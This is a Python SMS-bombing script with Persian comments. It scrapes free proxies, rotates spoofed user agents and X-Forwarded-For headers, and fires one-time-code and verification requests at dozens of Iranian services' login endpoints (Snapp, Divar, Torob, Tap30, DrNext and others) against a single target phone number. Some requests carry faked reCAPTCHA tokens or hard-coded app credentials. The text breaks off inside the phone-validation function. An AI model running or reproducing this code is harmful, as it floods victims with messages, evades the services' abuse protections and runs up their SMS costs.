from platform import node, system, release
from os import system, name
from re import match, sub, findall
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
from time import sleep
from requests import get, post, options
import random
import threading
from bs4 import BeautifulSoup
import json

# غیرفعال کردن هشدارهای SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# قفل برای نمایش خروجی بدون تداخل
print_lock = threading.Lock()
proxy_list = []
proxy_lock = threading.Lock()

# رنگ‌ها
r = '\033[1;31m'
g = '\033[32;1m'
y = '\033[1;33m'
w = '\033[1;37m'
b = '\033[34;1m'
c = '\033[36;1m'

def safe_print(text):
    """چاپ ایمن با قفل"""
    with print_lock:
        print(text)

def fetch_proxies_from_url(url):
    """استخراج پروکسی از لینک مستقیم"""
    try:
        safe_print(f"{y}[*] Fetching proxies from: {url}")
        response = get(url, timeout=10, verify=False)
        
        if response.status_code == 200:
            proxies = []
            content = response.text
            
            # استخراج با الگوهای مختلف
            # الگو: ip:port
            ip_port_pattern = r'\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?):\d{2,5}\b'
            found_proxies = findall(ip_port_pattern, content)
            proxies.extend(found_proxies)
            
            # اگر JSON بود
            try:
                json_data = response.json()
                if isinstance(json_data, list):
                    for item in json_data:
                        if isinstance(item, dict):
                            if 'ip' in item and 'port' in item:
                                proxies.append(f"{item['ip']}:{item['port']}")
                            elif 'proxy' in item:
                                proxies.append(item['proxy'])
                elif isinstance(json_data, dict):
                    if 'proxies' in json_data and isinstance(json_data['proxies'], list):
                        for p in json_data['proxies']:
                            if isinstance(p, dict) and 'ip' in p and 'port' in p:
                                proxies.append(f"{p['ip']}:{p['port']}")
            except:
                pass
            
            # حذف تکراری‌ها
            proxies = list(set(proxies))
            
            # تبدیل به فرمت پروکسی
            formatted_proxies = []
            for proxy in proxies:
                formatted_proxies.append({
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                })
            
            safe_print(f"{g}[+] Found {len(formatted_proxies)} proxies from {url}")
            return formatted_proxies
    except Exception as e:
        safe_print(f"{r}[-] Error fetching proxies from {url}: {e}")
    
    return []

def fetch_free_proxy_list():
    """استخراج پروکسی از free-proxy-list.net"""
    try:
        url = "https://free-proxy-list.net/"
        response = get(url, timeout=10, verify=False)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        proxies = []
        table = soup.find('table', {'id': 'proxylisttable'})
        if table:
            rows = table.find('tbody').find_all('tr')
            for row in rows[:100]:  # گرفتن 100 تا اول
                cols = row.find_all('td')
                if len(cols) >= 7:
                    ip = cols[0].text.strip()
                    port = cols[1].text.strip()
                    https = cols[6].text.strip()
                    if https == 'yes':  # فقط HTTPS
                        proxies.append({
                            "http": f"http://{ip}:{port}",
                            "https": f"http://{ip}:{port}"
                        })
        return proxies
    except Exception as e:
        safe_print(f"{r}[-] Error fetching from free-proxy-list: {e}")
        return []

def fetch_ssl_proxies():
    """استخراج پروکسی از sslproxies.org"""
    try:
        url = "https://www.sslproxies.org/"
        response = get(url, timeout=10, verify=False)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        proxies = []
        table = soup.find('table', {'id': 'proxylisttable'})
        if table:
            rows = table.find('tbody').find_all('tr')
            for row in rows[:100]:
                cols = row.find_all('td')
                if len(cols) >= 2:
                    ip = cols[0].text.strip()
                    port = cols[1].text.strip()
                    proxies.append({
                        "http": f"http://{ip}:{port}",
                        "https": f"http://{ip}:{port}"
                    })
        return proxies
    except Exception as e:
        safe_print(f"{r}[-] Error fetching from sslproxies: {e}")
        return []

def fetch_proxies_from_github():
    """استخراج پروکسی از مخازن گیت‌هاب"""
    github_urls = [
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
        "https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repository/master/proxy_list.txt",
        "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list.txt",
        "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
        "https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/http.txt"
    ]
    
    all_proxies = []
    for url in github_urls:
        try:
            safe_print(f"{y}[*] Fetching from GitHub: {url.split('/')[-1]}")
            response = get(url, timeout=10, verify=False)
            if response.status_code == 200:
                count = 0
                for line in response.text.strip().split('\n'):
                    line = line.strip()
                    if ':' in line and not line.startswith('#'):
                        all_proxies.append({
                            "http": f"http://{line}",
                            "https": f"http://{line}"
                        })
                        count += 1
                safe_print(f"{g}[+] Found {count} proxies from {url.split('/')[-1]}")
        except Exception as e:
            safe_print(f"{r}[-] Error fetching from {url}: {e}")
            continue
    
    return all_proxies

def fetch_proxies_from_proxyscrape():
    """استخراج پروکسی از proxyscrape.com"""
    urls = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=yes&anonymity=all",
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&proxy_format=ipport&format=text",
        "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&proxy_format=ipport&format=text&timeout=20000"
    ]
    
    all_proxies = []
    for url in urls:
        try:
            response = get(url, timeout=10, verify=False)
            if response.status_code == 200:
                count = 0
                for line in response.text.strip().split('\n'):
                    line = line.strip()
                    if ':' in line:
                        all_proxies.append({
                            "http": f"http://{line}",
                            "https": f"http://{line}"
                        })
                        count += 1
                safe_print(f"{g}[+] Found {count} proxies from ProxyScrape")
        except Exception as e:
            safe_print(f"{r}[-] Error fetching from ProxyScrape: {e}")
            continue
    
    return all_proxies

def fetch_proxies_from_proxydb():
    """استخراج پروکسی از proxydb.net"""
    try:
        url = "http://proxydb.net/?protocol=http&protocol=https&country=&anonlvl=4&anonlvl=3&anonlvl=2"
        response = get(url, timeout=10, verify=False)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        proxies = []
        table = soup.find('table', {'class': 'table'})
        if table:
            rows = table.find_all('tr')[1:]  # رد کردن هدر
            for row in rows[:50]:
                cols = row.find_all('td')
                if len(cols) >= 2:
                    ip_port = cols[0].text.strip()
                    if ':' in ip_port:
                        proxies.append({
                            "http": f"http://{ip_port}",
                            "https": f"http://{ip_port}"
                        })
        return proxies
    except Exception as e:
        safe_print(f"{r}[-] Error fetching from ProxyDB: {e}")
        return []

def update_proxy_list(proxy_urls=None):
    """به‌روزرسانی لیست پروکسی از منابع مختلف"""
    global proxy_list
    
    with proxy_lock:
        safe_print(f"{y}[!] Updating proxy list from multiple sources...")
        
        all_proxies = []
        
        if proxy_urls:
            # دریافت از لینک‌های کاربر
            for url in proxy_urls:
                proxies = fetch_proxies_from_url(url)
                all_proxies.extend(proxies)
        else:
            # دریافت از منابع پیش‌فرض
            safe_print(f"{y}[*] Fetching from default sources...")
            all_proxies.extend(fetch_proxies_from_github())
            all_proxies.extend(fetch_proxies_from_proxyscrape())
            all_proxies.extend(fetch_free_proxy_list())
            all_proxies.extend(fetch_ssl_proxies())
            all_proxies.extend(fetch_proxies_from_proxydb())
        
        # حذف تکراری‌ها
        unique_proxies = []
        seen = set()
        for proxy in all_proxies:
            proxy_str = str(proxy)
            if proxy_str not in seen:
                seen.add(proxy_str)
                unique_proxies.append(proxy)
        
        proxy_list = unique_proxies
        safe_print(f"{g}[+] Total unique proxies collected: {len(proxy_list)}")
        
        if len(proxy_list) == 0:
            safe_print(f"{r}[-] No proxies found, using direct connection")
            proxy_list.append(None)

def get_random_proxy():
    """انتخاب پروکسی تصادفی از لیست"""
    global proxy_list
    if not proxy_list:
        return None
    return random.choice(proxy_list)

# لیست User-Agent های مختلف برای چرخش
USER_AGENTS = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
]

def get_random_headers(base_headers=None):
    """ایجاد هدرهای تصادفی برای هر درخواست"""
    headers = base_headers.copy() if base_headers else {}
    headers["User-Agent"] = random.choice(USER_AGENTS)
    headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    headers["Accept-Language"] = random.choice(["fa-IR,fa;q=0.9,en;q=0.8", "en-US,en;q=0.9", "fa,en;q=0.9", "en-US,en;q=0.9,fa;q=0.8"])
    headers["Accept-Encoding"] = random.choice(["gzip, deflate, br", "gzip, deflate", "gzip, deflate, br, zstd"])
    headers["Cache-Control"] = random.choice(["no-cache", "max-age=0", "no-store", "no-transform"])
    return headers

# توابع ارسال درخواست
def classino(phone):
    classino_url = "https://panel.classino.com/api/v1/auth/login"
    classino_data = {"mobile": "0" + phone.split("+98")[1]}
    classino_headers = {
        "Authorization": "Bearer null",
        "Origin": "https://panel.classino.com",
        "Referer": "https://panel.classino.com/",
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*"
    }
    try:
        headers = get_random_headers(classino_headers)
        response = post(classino_url, json=classino_data, headers=headers, 
                       proxies=get_random_proxy(), timeout=5, verify=False)
        if response.status_code == 200:
            safe_print(f'{g}(Classino) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def alibaba(phone):
    alibaba_url = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
    alibaba_data = {"phoneNumber": "0" + phone.split("+98")[1]}
    alibaba_headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "X-Client-Name": "WEB-NEW,PRODUCTION,CSR,www.alibaba.ir,mobile,Mobile Safari,16.6,iPhone,Apple,iOS,16.7.10,3.204.8",
        "X-Request-Id": str(random.randint(1000000000, 9999999999)),
        "X-Request-Sign": "3HavSnLx3FyA5XofiPT1Gf",
        "X-Client-Version": "mobile,Mobile Safari,16.6,iPhone,Apple,iOS",
        "X-Requested-With": "Identity"
    }
    try:
        headers = get_random_headers(alibaba_headers)
        response = post(alibaba_url, json=alibaba_data, headers=headers,
                       proxies=get_random_proxy(), timeout=5, verify=False)
        if response.status_code == 200 and response.json().get("success") == True:
            safe_print(f'{g}(Alibaba) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def tetherland(phone):
    tetherland_url = "https://service.tetherland.com/api/v5/login-register"
    tetherland_data = {
        "mobile": "0" + phone.split("+98")[1],
        "device_info": {
            "brand": random.choice(["Apple", "Samsung", "Xiaomi", "Huawei"]),
            "model": random.choice(["iPhone", "SM-G998B", "M2007J20CG", "P40 Pro"]),
            "browserVersion": f"{random.randint(14,17)}.{random.randint(0,9)}",
            "app_version": "",
            "by": "web",
            "osName": random.choice(["iOS", "Android"]),
            "osVersion": f"{random.randint(11,16)}.{random.randint(0,9)}.{random.randint(0,10)}",
            "browserName": "Mobile Safari",
            "platform": "web",
            "name": random.choice(["iOS", "Android"]),
            "device": "web"
        },
        "otp_type": "sms",
        "device": "web"
    }
    try:
        headers = get_random_headers({})
        response = post(tetherland_url, json=tetherland_data, headers=headers,
                       proxies=get_random_proxy(), timeout=5, verify=False)
        if response.status_code == 200 and response.json().get("status") == True:
            safe_print(f'{g}(Tetherland) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def jabama(phone):
    jabama_url = "https://gw.jabama.com/api/v4/account/send-code"
    jabama_data = {"mobile": "0" + phone.split("+98")[1]}
    jabama_headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json;charset=utf-8",
        "X-Client-Info": f"GuestPWA,Vue2.86.2,{random.choice(['iOS', 'Android'])},{random.randint(14,17)}.{random.randint(0,9)}.{random.randint(0,10)},undefined,{random.randint(100000000, 999999999)}-{random.randint(1000,9999)}-{random.randint(1000,9999)}-{random.randint(1000,9999)}-{random.randint(100000000, 999999999)}",
    }
    try:
        headers = get_random_headers(jabama_headers)
        response = post(jabama_url, json=jabama_data, headers=headers,
                       proxies=get_random_proxy(), timeout=5, verify=False)
        if response.status_code == 200 and response.json().get("success") == True:
            safe_print(f'{g}(Jabama) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def mobit(phone):
    mobit_url = "https://api.mobit.ir/api/web/v8/register/register"
    mobit_data = {
        "number": "0" + phone.split("+98")[1],
        "hash_1": random.randint(1000000000, 9999999999),
        "hash_2": ''.join(random.choices('0123456789abcdef', k=64))
    }
    mobit_headers = {
        "Accept": "application/json",
        "User-Agent": "mobit_web",
        "Origin": "https://www.mobit.ir",
        "Referer": "https://www.mobit.ir/",
        "Content-Type": "application/json;charset=utf-8",
    }
    try:
        headers = get_random_headers(mobit_headers)
        response = post(mobit_url, json=mobit_data, headers=headers,
                       proxies=get_random_proxy(), timeout=5, verify=False)
        if response.status_code == 200 and response.json().get("success") == True:
            safe_print(f'{g}(Mobit) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def smarket(phone):
    smarketU = f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{phone.split("+98")[1]}'
    smarketH = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'text/plain;charset=UTF-8',
        'origin': 'https://snapp.market',
        'referer': 'https://snapp.market/',
    }
    try:
        headers = get_random_headers(smarketH)
        smarketR = post(timeout=5, url=smarketU, headers=headers, 
                       proxies=get_random_proxy(), verify=False).json()
        if smarketR['status'] == True:
            safe_print(f'{g}(SnapMarket) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def okorosh(phone):
    okJ = {
        "mobile": "0"+phone.split("+98")[1],
        "g-recaptcha-response": "03AGdBq25" + ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_', k=100))
    }
    okU = 'https://my.okcs.com/api/check-mobile'
    okH = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://my.okcs.com',
        'referer': 'https://my.okcs.com/',
        'x-requested-with': 'XMLHttpRequest',
    }
    try:
        headers = get_random_headers(okH)
        okR = post(timeout=5, url=okU, headers=headers, json=okJ,
                  proxies=get_random_proxy(), verify=False).text
        if 'success' in okR:
            safe_print(f'{g}(OfoghKourosh) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def snap(phone):
    snapH = {
        "x-app-name": "passenger-pwa",
        "x-app-version": f"{random.randint(4,6)}.{random.randint(0,9)}.{random.randint(0,9)}",
        "app-version": "pwa",
        "content-type": "application/json",
        "accept": "*/*",
        "origin": "https://app.snapp.taxi",
        "referer": "https://app.snapp.taxi/login/",
    }
    snapD = {"cellphone": phone}
    try:
        headers = get_random_headers(snapH)
        snapR = post(timeout=5, url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", 
                    headers=headers, json=snapD, proxies=get_random_proxy(), verify=False).text
        if "OK" in snapR:
            safe_print(f'{g}(Snap) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def gap(phone):
    gapH = {
        "accept": "application/json, text/plain, */*",
        "x-version": f"{random.randint(4,5)}.{random.randint(0,9)}.{random.randint(0,9)}",
        "accept-language": "fa",
        "appversion": "web",
        "origin": "https://web.gap.im",
        "referer": "https://web.gap.im/",
    }
    try:
        headers = get_random_headers(gapH)
        gapR = get(timeout=5, url="https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1]), 
                  headers=headers, proxies=get_random_proxy(), verify=False).text
        if "OK" in gapR:
            safe_print(f'{g}(Gap) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def tap30(phone):
    tap30H = {
        "Connection": "keep-alive",
        "content-type": "application/json",
        "Accept": "*/*",
        "Origin": "https://app.tapsi.cab",
        "Referer": "https://app.tapsi.cab/",
    }
    tap30D = {"credential": {"phoneNumber": "0"+phone.split("+98")[1], "role": "PASSENGER"}}
    try:
        headers = get_random_headers(tap30H)
        tap30R = post(timeout=5, url="https://tap33.me/api/v2/user", headers=headers, 
                     json=tap30D, proxies=get_random_proxy(), verify=False).json()
        if tap30R.get('result') == "OK":
            safe_print(f'{g}(Tap30) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def divar(phone):
    divarH = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://divar.ir',
        'referer': 'https://divar.ir/',
        'x-standard-divar-error': 'true'
    }
    divarD = {"phone": phone.split("+98")[1]}
    try:
        headers = get_random_headers(divarH)
        divarR = post(timeout=5, url="https://api.divar.ir/v5/auth/authenticate", 
                     headers=headers, json=divarD, proxies=get_random_proxy(), verify=False).json()
        if divarR.get("authenticate_response") == "AUTHENTICATION_VERIFICATION_CODE_SENT":
            safe_print(f'{g}(Divar) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def torob(phone):
    phone = '0'+phone.split('+98')[1]
    torobH = {
        'accept': '*/*',
        'origin': 'https://torob.com',
        'referer': 'https://torob.com/',
    }
    try:
        headers = get_random_headers(torobH)
        torobR = get(timeout=5, url=f"https://api.torob.com/a/phone/send-pin/?phone_number={phone}", 
                    headers=headers, proxies=get_random_proxy(), verify=False).json()
        if torobR.get("message") == "pin code sent":
            safe_print(f'{g}(Torob) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def one(phone):
    a = "http://app.insatel.ir/client_webservices.php"
    b = f"ac=10&appname=fk&phonenumber={phone}&token=mw0yDKRVld&serial=null&keyname=verify2"
    d = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "Keep-Alive",
        "User-Agent": "okhttp/3.12.1"
    }
    try:
        headers = get_random_headers(d)
        response = post(a, data=b, headers=headers, proxies=get_random_proxy(), timeout=5, verify=False)
        return response.status_code == 200
    except:
        return False

def two(phone):
    a = "http://setmester.com/mrfallowtel_glp/client_webservices4.php"
    b = f"ac=9&username=gyjoo8uyt&password=123456&fullname=hkurdds6&phonenumber={phone}&token=1uhljuqBpI&serial=null"
    d = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "Keep-Alive",
        "User-Agent": "okhttp/3.12.1"
    }
    try:
        headers = get_random_headers(d)
        response = post(a, data=b, headers=headers, proxies=get_random_proxy(), timeout=5, verify=False)
        return response.status_code == 200
    except:
        return False

def tree(phone):
    a = "http://jozamoza.com/com.cyberspaceservices.yb/client_webservices4.php"
    b = f"ac=9&username=sjwo7ehd&password=123456&fullname=dheoe9dy&phonenumber={phone}&token=qqcI33qkGC&serial=null"
    d = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "Keep-Alive",
        "User-Agent": "okhttp/3.12.1"
    }
    try:
        headers = get_random_headers(d)
        response = post(a, data=b, headers=headers, proxies=get_random_proxy(), timeout=5, verify=False)
        return response.status_code == 200
    except:
        return False

def fwor(phone):
    a = "https://api.nazdika.com/v3/account/request-login/"
    b = f"phone={phone}"
    d = {
        "Accept": "Application/JSON",
        "X-ODD-User-Agent": f"Mozilla/9.0 (Linux; Android {random.randint(9,13)}; M9007J540CG Build/QKQ1.97512.002; wv) AppleWebKit/9977.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randint(80,120)}.0.4896.127 Mobile Safari/999.36",
        "X-ODD-Operator": random.choice(["IR-MCI,IR-MCI", "Irancell,MTN Irancell", "Rightel,Rightel"]),
        "X-ODD-SOURCE": f"Nazdika-v-{random.randint(1000,2000)}",
        "X-ODD-MARKET": random.choice(["googlePlay", "cafeBazaar", "myket"]),
        "X-ODD-ANDROID-ID": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=32)),
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "Keep-Alive",
    }
    try:
        headers = get_random_headers(d)
        response = post(a, data=b, headers=headers, proxies=get_random_proxy(), timeout=5, verify=False)
        return response.status_code == 200
    except:
        return False

def five(phone):
    a = "http://followmember2022.ir/followmember/client_webservices4.php"
    b = f"ac=10&phonenumber={phone}&token=CLTRIcCmcT&serial=null"
    d = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "Keep-Alive",
        "User-Agent": "okhttp/3.12.1"
    }
    try:
        headers = get_random_headers(d)
        response = post(a, data=b, headers=headers, proxies=get_random_proxy(), timeout=5, verify=False)
        return response.status_code == 200
    except:
        return False

def six(phone):
    a = "https://iranstor1.ir/index.php/api/login?sms.ir"
    b = f"fullname=alimahmoodiu&mobile={phone}&device_id={random.randint(10000000000, 99999999999)}&token=c5aef1158542ea0932c1916f829d943c"
    d = {
        "key": "d41d8cd98f00b204e9800998ecf8427e",
        "apptoken": "VdOIvN6tHdgjNrmCr0PvSg==:NTU1ZDBhNGNiODY0NzgyNA==",
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": "okhttp/3.5.0"
    }
    try:
        headers = get_random_headers(d)
        response = post(a, data=b, headers=headers, proxies=get_random_proxy(), timeout=5, verify=False)
        return response.status_code == 200
    except:
        return False

def seven(phone):
    a = "https://homa.petabad.com/customer/signup"
    b = f"my_server_api_version=1&platform=android&my_app_type=android&my_app_version={random.randint(15,20)}&time_zone_offset=270&app_name=customer&phone_number={phone}"
    d = {
        "user-agent": f"Dart/2.{random.randint(10,18)} (dart:io)",
        "content-type": "application/x-www-form-urlencoded; charset=utf-8",
    }
    try:
        headers = get_random_headers(d)
        response = post(a, data=b, headers=headers, proxies=get_random_proxy(), timeout=5, verify=False)
        return response.status_code == 200
    except:
        return False

def eyit(phone):
    a = "https://takhfifan.com/api/jsonrpc/1_0/"
    session_id = ''.join(random.choices('0123456789abcdef', k=32))
    b = {"id": random.randint(100000000000000000, 999999999999999999), 
         "method": "customerExistOtp", 
         "params": [session_id, {"username": phone}]}
    d = {
        "x-session": session_id,
        "content-type": "takhfifanApp/json",
        "user-agent": "okhttp/3.14.9"
    }
    try:
        headers = get_random_headers(d)
        response = post(a, json=b, headers=headers, proxies=get_random_proxy(), timeout=5, verify=False)
        return response.status_code == 200
    except:
        return False

def niyne(phone):
    a = "http://baharapp.xyz/api/v1.1/reqSMS.php"
    b = f"phone={phone}&"
    d = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": f"Dalvik/2.1.0 (Linux; U; Android {random.randint(9,13)}; M2007J208CG MIUI/V{random.randint(12,14)}.0.{random.randint(0,9)}.0.QJGMIXM)",
        "Connection": "Keep-Alive",
    }
    try:
        headers = get_random_headers(d)
        response = post(a, data=b, headers=headers, proxies=get_random_proxy(), timeout=5, verify=False)
        return response.status_code == 200
    except:
        return False

def ten(phone):
    a = "http://serverpv1.xyz/api/v1/reqSMS"
    b = f"phone={phone}&"
    d = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": f"Dalvik/2.1.0 (Linux; U; Android {random.randint(9,13)}; M2007J208CG MIUI/V{random.randint(12,14)}.0.{random.randint(0,9)}.0.QJGMIXM)",
        "Connection": "Keep-Alive",
    }
    try:
        headers = get_random_headers(d)
        response = post(a, data=b, headers=headers, proxies=get_random_proxy(), timeout=5, verify=False)
        return response.status_code == 200
    except:
        return False

def eleven(phone):
    a = "http://kolbeapp.xyz/api/v1/reqSMS"
    b = f"phone={phone}&"
    d = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": f"Dalvik/2.1.0 (Linux; U; Android {random.randint(9,13)}; M2007J208CG MIUI/V{random.randint(12,14)}.0.{random.randint(0,9)}.0.QJGMIXM)",
        "Connection": "Keep-Alive",
    }
    try:
        headers = get_random_headers(d)
        response = post(a, data=b, headers=headers, proxies=get_random_proxy(), timeout=5, verify=False)
        return response.status_code == 200
    except:
        return False

def tovelf(phone):
    a = "http://arezooapp.xyz/api/v1/reqSMS"
    b = f"phone={phone}&"
    d = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": f"Dalvik/2.1.0 (Linux; U; Android {random.randint(9,13)}; M2007J208CG MIUI/V{random.randint(12,14)}.0.{random.randint(0,9)}.0.QJGMIXM)",
        "Connection": "Keep-Alive",
    }
    try:
        headers = get_random_headers(d)
        response = post(a, data=b, headers=headers, proxies=get_random_proxy(), timeout=5, verify=False)
        return response.status_code == 200
    except:
        return False

def therty(phone):
    a = "http://servermv1.xyz/api/v1/reqSMS"
    b = f"phone={phone}&"
    d = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": f"Dalvik/2.1.0 (Linux; U; Android {random.randint(9,13)}; M2007J208CG MIUI/V{random.randint(12,14)}.0.{random.randint(0,9)}.0.QJGMIXM)",
        "Connection": "Keep-Alive",
    }
    try:
        headers = get_random_headers(d)
        response = post(a, data=b, headers=headers, proxies=get_random_proxy(), timeout=5, verify=False)
        return response.status_code == 200
    except:
        return False

def forty(phone):
    a = "https://core.otaghak.com/odata/Otaghak/Users/ReadyForLogin"
    b = {"userName": phone}
    d = {
        "app-version": str(random.randint(230, 240)),
        "app-version-name": f"{random.randint(5,6)}.{random.randint(10,15)}.{random.randint(0,9)}",
        "app-client": "guest",
        "device-model": random.choice(["POCO M2007J20CG", "Xiaomi M2012K11G", "Samsung SM-G998B"]),
        "device-sdk": str(random.randint(28, 31)),
        "user-agent": f"app:{random.randint(5,6)}.{random.randint(10,15)}.{random.randint(0,9)}({random.randint(230,240)})@{random.choice(['POCO M2007J20CG', 'Xiaomi M2012K11G', 'Samsung SM-G998B'])}",
        "content-type": "application/json; charset=UTF-8",
    }
    try:
        headers = get_random_headers(d)
        response = post(a, json=b, headers=headers, proxies=get_random_proxy(), timeout=5, verify=False)
        return response.status_code == 200
    except:
        return False

def fifty(phone):
    a = "https://gharar.ir/api/v1/users/"
    b = {"phone": phone}
    d = {
        "appversion": f"{random.randint(1,2)}.{random.randint(5,9)}.{random.randint(0,9)}",
        "content-type": "application/json; charset=UTF-8",
        "user-agent": "okhttp/4.9.2"
    }
    try:
        headers = get_random_headers(d)
        response = post(a, json=b, headers=headers, proxies=get_random_proxy(), timeout=5, verify=False)
        return response.status_code == 200
    except:
        return False

def sixty(phone):
    a = "http://serverhv1.xyz/api/v1.1/reqSMS.php"
    b = f"phone={phone}&"
    d = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": f"Dalvik/2.1.0 (Linux; U; Android {random.randint(9,13)}; M2007J208CG MIUI/V{random.randint(12,14)}.0.{random.randint(0,9)}.0.QJGMIXM)",
        "Connection": "Keep-Alive",
    }
    try:
        headers = get_random_headers(d)
        response = post(a, data=b, headers=headers, proxies=get_random_proxy(), timeout=5, verify=False)
        return response.status_code == 200
    except:
        return False

def sventtubf(phone):
    headers = {
        "accept-language": "fa",
        "accept": "application/json, text/plain, */*",
        "origin": "https://panel.drnext.ir",
        "referer": "https://panel.drnext.ir/",
    }
    try:
        rand_headers = get_random_headers(headers)
        get_response = get(f"https://cyclops.drnext.ir/v1/doctors/auth/check-doctor-exists-by-mobile?mobile={phone}", 
                          headers=rand_headers, proxies=get_random_proxy(), timeout=5, verify=False)
        
        post_headers = rand_headers.copy()
        post_headers["content-type"] = "application/json;charset=UTF-8"
        post_response1 = post("https://cyclops.drnext.ir/v1/doctors/auth/send-verification-token", 
                             json={"mobile": phone}, headers=post_headers, 
                             proxies=get_random_proxy(), timeout=5, verify=False)
        
        post_response2 = post("https://cyclops.drnext.ir/v1/doctors/auth/call-verification-token", 
                             json={"mobile": phone}, headers=post_headers, 
                             proxies=get_random_proxy(), timeout=5, verify=False)
        
        if get_response.status_code == 200 and post_response1.status_code == 200 and post_response2.status_code == 200:
            safe_print(f'{g}(DrNext) {w}Code Was Sent')
            return True
    except:
        pass
    return False

def is_phone(phone: str):
    phone = sub(r"\s+", "", phone.strip())
    if match(r"^\+989[0-9]{9}$", phone):
        return phone
    elif match(r"^989[0-9]{9}$", phone):
        return f"+{phone}"
    elif match(r"^09[0-9]{9}$", phone):
        return f"+98{phone[1:]}"
    elif match(r"^9[0-9]{9}$", phone):
